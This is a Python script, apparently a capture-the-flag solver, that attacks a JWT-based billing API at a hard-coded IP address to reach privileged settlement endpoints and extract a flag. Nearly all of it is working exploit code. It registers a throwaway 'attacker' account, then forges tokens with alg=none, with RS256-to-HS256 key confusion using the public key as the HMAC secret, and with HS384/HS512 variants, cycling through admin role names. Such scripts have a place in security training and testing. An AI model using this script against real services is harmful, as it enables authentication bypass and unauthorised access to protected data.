#!/usr/bin/env python3
import argparse
import base64
import hashlib
import hmac
import json
import random
import re
import string
import time
import uuid

import jwt
import requests
from cryptography.hazmat.primitives import serialization
from jwt.algorithms import RSAAlgorithm


FLAG_RE = re.compile(r"GoH\{[^}\n]+\}")


def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def jwt_none(payload: dict) -> str:
    header = {"alg": "none", "typ": "JWT"}
    return f"{b64url(json.dumps(header, separators=(',', ':')).encode())}.{b64url(json.dumps(payload, separators=(',', ':')).encode())}."


def jwt_hmac(payload: dict, secret: str, alg: str = "HS256", kid: str | None = None) -> str:
    alg_map = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}
    if alg not in alg_map:
        raise ValueError(f"Unsupported alg: {alg}")
    header = {"alg": alg, "typ": "JWT"}
    if kid:
        header["kid"] = kid
    header_b64 = b64url(json.dumps(header, separators=(",", ":")).encode())
    payload_b64 = b64url(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{header_b64}.{payload_b64}".encode()
    sig = hmac.new(secret.encode(), signing_input, alg_map[alg]).digest()
    return f"{header_b64}.{payload_b64}.{b64url(sig)}"


def rand_tag(n: int = 6) -> str:
    return "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(n))


def get_flag(text: str):
    m = FLAG_RE.search(text or "")
    return m.group(0) if m else None


def req_json(s: requests.Session, method: str, url: str, **kwargs):
    r = s.request(method, url, timeout=12, **kwargs)
    try:
        return r.status_code, r.json(), r.text
    except Exception:
        return r.status_code, None, r.text


def auth_get(s: requests.Session, base: str, endpoint: str, token: str):
    return req_json(s, "GET", f"{base}{endpoint}", headers={"Authorization": f"Bearer {token}"})


def try_token(s: requests.Session, base: str, token: str, endpoints: list[str]):
    for ep in endpoints:
        code, j, raw = auth_get(s, base, ep, token)
        blob = json.dumps(j, ensure_ascii=False) if j is not None else raw
        flag = get_flag(blob)
        if code >= 400:
            snippet = (blob or "").replace("\n", " ")[:160]
            print(f"[try] {ep} -> {code} | {snippet}")
        else:
            print(f"[try] {ep} -> {code}")
        if flag:
            print(f"[+] FLAG FOUND in {ep}: {flag}")
            return flag
    return None


def build_payload(base_payload: dict, role: str):
    now = int(time.time())
    p = dict(base_payload)
    p["role"] = role
    p["iat"] = now
    p["exp"] = now + 24 * 3600
    p["jti"] = str(uuid.uuid4())
    return p


def main():
    ap = argparse.ArgumentParser(description="Celari BSS JWT solver")
    ap.add_argument("--base", default="http://209.38.92.205:33069", help="Base URL")
    args = ap.parse_args()
    base = args.base.rstrip("/")

    s = requests.Session()
    s.headers.update({"User-Agent": "celari-bss-solver/1.0"})

    print(f"[*] Target: {base}")
    code, root_j, root_raw = req_json(s, "GET", f"{base}/")
    print(f"[*] / -> {code}")
    if code >= 500 or code == 0:
        print("[!] Target seems unavailable.")

    code, jwks, jwks_raw = req_json(s, "GET", f"{base}/.well-known/jwks.json")
    print(f"[*] /.well-known/jwks.json -> {code}")
    if not isinstance(jwks, dict) or not jwks.get("keys"):
        print("[!] No JWKS available; cannot continue.")
        return

    jwk = jwks["keys"][0]
    pubkey_obj = RSAAlgorithm.from_jwk(json.dumps(jwk))
    pubkey_pem = pubkey_obj.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo,
    ).decode()
    print(f"[*] JWKS kid={jwk.get('kid')} alg={jwk.get('alg')}")

    reg_body = {"company_name": f"attacker-{rand_tag()}", "country": "KE"}
    code, reg_j, reg_raw = req_json(
        s,
        "POST",
        f"{base}/api/bss/v1/auth/register",
        json=reg_body,
        headers={"Content-Type": "application/json"},
    )
    print(f"[*] register -> {code}")
    if not isinstance(reg_j, dict) or "token" not in reg_j:
        print("[!] Registration failed.")
        print(reg_raw[:400])
        return

    legit = reg_j["token"]
    unverified_header = jwt.get_unverified_header(legit)
    base_payload = jwt.decode(legit, options={"verify_signature": False})
    print(f"[*] Legit role={base_payload.get('role')} sub={base_payload.get('sub')}")

    endpoints = [
        "/api/bss/v1/settlement/CELARI-INT",
        "/api/bss/v1/settlement/MTN-KE",
        "/api/bss/v1/settlement/summary",
        "/api/bss/v1/partners",
    ]
    privileged_endpoints = [
        "/api/bss/v1/settlement/CELARI-INT",
        "/api/bss/v1/settlement/MTN-KE",
    ]

    print("[*] Checking legit token quickly...")
    flag = try_token(s, base, legit, endpoints)
    if flag:
        return

    role_candidates = [
        "internal-settlement",
        "admin",
        "administrator",
        "superadmin",
        "settlement_admin",
        "carrier_admin",
        "interconnect_admin",
        "bss_admin",
        "internal",
        "ops",
        "partner_admin",
        "wholesale_admin",
    ]

    print("[*] Trying alg=none with elevated roles...")
    for role in role_candidates:
        p = build_payload(base_payload, role)
        tok = jwt_none(p)
        flag = try_token(s, base, tok, privileged_endpoints)
        if flag:
            return

    hs_secrets = [
        pubkey_pem,
        json.dumps(jwks, separators=(",", ":")),
        json.dumps(jwk, separators=(",", ":")),
        jwk.get("n", ""),
        jwk.get("kid", ""),
        reg_j.get("api_key", ""),
    ]
    hs_secrets = [x for x in hs_secrets if x]

    print("[*] Trying RS256->HS256 confusion variants...")
    for secret in hs_secrets:
        for role in role_candidates:
            p = build_payload(base_payload, role)
            tok = jwt_hmac(
                p,
                secret,
                alg="HS256",
                kid=unverified_header.get("kid", jwk.get("kid", "k1")),
            )
            flag = try_token(s, base, tok, privileged_endpoints)
            if flag:
                return

    print("[*] Trying HS384/HS512 variants...")
    for alg in ("HS384", "HS512"):
        for role in role_candidates:
            p = build_payload(base_payload, role)
            tok = jwt_hmac(
                p,
                pubkey_pem,
                alg=alg,
                kid=unverified_header.get("kid", jwk.get("kid", "k1")),
            )
            flag = try_token(s, base, tok, privileged_endpoints)
            if flag:
                return

    print("[!] No flag found with current strategy.")
    print("[!] If still blocked, inspect exact error body for required role string and append it to role_candidates.")


if __name__ == "__main__":
    main()
